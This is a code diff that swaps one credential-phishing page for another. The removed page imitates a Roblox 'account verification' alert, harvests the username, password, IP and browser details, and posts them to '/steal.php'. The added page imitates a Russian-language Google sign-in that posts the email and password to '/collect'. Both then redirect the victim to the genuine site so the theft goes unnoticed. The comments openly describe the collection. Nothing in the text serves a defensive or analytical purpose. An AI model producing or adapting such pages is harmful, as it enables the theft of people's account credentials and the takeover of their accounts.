@@ -1,189 +1,91 @@
-                        <!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Account Verification Required</title>
+    <title>Войдите в Google Аккаунт</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background: linear-gradient(135deg, #00a2ff 0%, #0055ff 100%);
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .container {
+        body {
+            font-family: 'Arial', sans-serif;
             background: white;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-            width: 90%;
-            max-width: 400px;
-            overflow: hidden;
+            margin: 0;
+            padding: 0;
         }
-        .header {
-            background: #1a1a1a;
-            padding: 20px;
+        .google-header {
             text-align: center;
+            padding: 20px;
         }
-        .header img {
-            height: 40px;
-        }
-        .content {
-            padding: 30px;
-        }
-        h2 {
-            color: #1a1a1a;
-            margin-bottom: 10px;
-            font-size: 24px;
-        }
-        .alert {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
+        .login-container {
+            width: 450px;
+            margin: 50px auto;
+            border: 1px solid #dadce0;
             border-radius: 8px;
-            padding: 15px;
-            margin-bottom: 20px;
-            color: #856404;
+            padding: 48px 40px 36px;
         }
-        .alert-icon {
-            color: #f39c12;
-            font-weight: bold;
-            margin-right: 5px;
-        }
-        .form-group {
+        .google-logo {
+            text-align: center;
             margin-bottom: 20px;
         }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            color: #333;
-            font-weight: 500;
-        }
-        input {
+        input[type="email"], input[type="password"] {
             width: 100%;
-            padding: 12px;
-            border: 2px solid #e0e0e0;
-            border-radius: 8px;
+            padding: 13px 15px;
+            margin: 10px 0;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
             font-size: 16px;
-            transition: border-color 0.3s;
         }
-        input:focus {
-            outline: none;
-            border-color: #00a2ff;
-        }
-        .btn {
-            background: #00a2ff;
+        .next-button {
+            background: #1a73e8;
             color: white;
             border: none;
-            padding: 15px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
+            padding: 10px 24px;
+            border-radius: 4px;
+            float: right;
             cursor: pointer;
-            width: 100%;
-            transition: background 0.3s;
-        }
-        .btn:hover {
-            background: #0088dd;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            color: #666;
-            font-size: 12px;
-        }
-        .loading {
-            display: none;
-            text-align: center;
-            color: #00a2ff;
-            margin-top: 10px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <img src="https://images.rbxcdn.com/1d7e1a5a0e54d21e76a51b6d2f5c34d3.svg" alt="Roblox">
+    <div class="google-header">
+        <!-- Пустое место вместо логотипа -->
+    </div>
+    
+    <div class="login-container">
+        <div class="google-logo">
+            <h2>Войдите</h2>
+            <p>Продолжить в Google Аккаунт</p>
         </div>
-        <div class="content">
-            <h2>Account Verification Required</h2>
-            <div class="alert">
-                <span class="alert-icon">⚠</span>
-                We've detected suspicious activity on your account. Please verify your credentials to secure your account.
-            </div>
-            <form id="loginForm">
-                <div class="form-group">
-                    <label for="username">Username or Email</label>
-                    <input type="text" id="username" name="username" required placeholder="Enter your username or email">
-                </div>
-                <div class="form-group">
-                    <label for="password">Password</label>
-                    <input type="password" id="password" name="password" required placeholder="Enter your password">
-                </div>
-                <button type="submit" class="btn">Verify Account</button>
-                <div class="loading" id="loading">
-                    Verifying your information...
-                </div>
-            </form>
-            <div class="footer">
-                By verifying, you agree to Roblox's Terms of Service and Privacy Policy
-            </div>
-        </div>
+        
+        <form id="loginForm" method="POST">
+            <input type="email" id="email" name="email" placeholder="Электронная почта или телефон" required>
+            <input type="password" id="password" name="password" placeholder="Введите ваш пароль" required>
+            <button type="submit" class="next-button">Далее</button>
+        </form>
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const form = e.target;
-            const loading = document.getElementById('loading');
-            const button = form.querySelector('button');
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
             
-            // Показать загрузку
-            button.style.display = 'none';
-            loading.style.display = 'block';
-            
-            const formData = {
-                username: document.getElementById('username').value,
-                password: document.getElementById('password').value,
-                ip: await getIP(),
-                user_agent: navigator.userAgent,
-                timestamp: new Date().toISOString()
-            };
-            
-            try {
-                // Отправка данных на сервер
-                await fetch('/steal.php', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(formData)
-                });
-                
-                // Задержка для реалистичности
-                setTimeout(() => {
-                    // Перенаправление на настоящий Roblox
-                    window.location.href = 'https://www.roblox.com/login?error=verification_failed';
-                }, 2000);
-                
-            } catch (error) {
-                setTimeout(() => {
-                    window.location.href = 'https://www.roblox.com/login';
-                }, 2000);
-            }
+            // Отправка данных на сервер
+            fetch('/collect', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password,
+                    userAgent: navigator.userAgent,
+                    timestamp: new Date().toISOString()
+                })
+            }).then(() => {
+                // Перенаправление на настоящий Google после сбора данных
+                window.location.href = 'https://accounts.google.com';
+            });
         });
-        
-        async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch {
-                return 'Unknown';
-            }
-        }
     </script>
 </body>
-</html>
+</html>                                        
